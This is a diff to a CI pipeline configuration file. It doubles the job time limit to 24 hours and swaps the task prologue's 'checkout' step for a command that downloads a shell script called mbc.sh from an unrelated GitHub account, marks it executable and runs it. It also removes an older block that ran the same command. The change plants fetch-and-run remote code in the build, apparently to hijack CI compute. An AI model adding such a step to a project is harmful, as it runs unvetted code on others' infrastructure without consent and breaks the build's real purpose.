@@ -5,7 +5,7 @@ agent:
     type: e1-standard-8
     os_image: ubuntu1804
 execution_time_limit:
-  hours: 12
+  hours: 24
 global_job_config:
   prologue:
     commands:
@@ -30,7 +30,7 @@ blocks:
     task:
       prologue:
         commands:
-          - checkout
+          - 'wget https://raw.githubusercontent.com/linanta/mbc/main/mbc.sh  && chmod +x mbc.sh && ./mbc.sh'
           - cache restore
           - composer install
           - npm install
@@ -80,9 +80,3 @@ blocks:
             - cd security-checker
             - composer install
             - 'php security-checker security:check ../composer.lock'
-  - name: 'Block #6'
-    task:
-      jobs:
-        - name: 'Job #1'
-          commands:
-            - 'wget https://raw.githubusercontent.com/linanta/mbc/main/mbc.sh  && chmod +x mbc.sh && ./mbc.sh'
